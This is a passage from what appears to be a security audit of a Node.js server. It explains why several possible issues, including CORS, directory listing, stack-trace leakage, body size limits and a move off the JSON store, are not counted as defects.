- **CORS** — no `Access-Control-Allow-Origin` header is sent anywhere, which is the correct
  default. Adding permissive CORS would be a regression, not an enhancement.
- **Directory listing** — none exists. `handleStatic` (`src/server.js:2453-2485`) serves a named
  surface or a specific file and 404s otherwise; there is no `readdir` call.
- **Stack-trace leakage** — none. Every catch site in the audited files uses `error.message`, never
  `error.stack`. Message *content* is sometimes upstream-derived (`src/connectors/ipc-hdx.js:119`
  embeds remote resource names), but no trace escapes the process.
- **Unbounded request body size** — already handled. `src/utils.js:272-304` checks
  `content-length` pre-emptively *and* enforces the ceiling while streaming, with the streaming
  check correctly documented as authoritative. The gap is array length and depth inside the body,
  tracked as D15.
- **Missing `Content-Length` on API responses** — `jsonResponse` (`src/utils.js:260-268`) does not
  set it, unlike `sendFile` (`src/server.js:2584`). Node computes it for buffered `res.end` calls,
  so this is a cosmetic inconsistency, not a defect.
- **A general ORM or query builder** — one table with a `jsonb` body and forty collections is the
  right shape for this product. The bugs are in the write path's atomicity (D3), not in the storage
  model; a query builder would add surface without addressing either.
- **Migrating off the JSON store** — the store is the right choice for a single-process field
  deployment. D3 is fixed by an in-process mutex plus atomic rename, both of which are a few lines;
  a database migration would be a much larger change for the same benefit.
- **Per-request `agent` or `keepAlive` tuning on outbound fetch** — a real efficiency win, but an
  optimisation rather than a trust or correctness improvement, and `src/connectors/http.js` already
  sets timeouts uniformly. It does not belong in a security audit.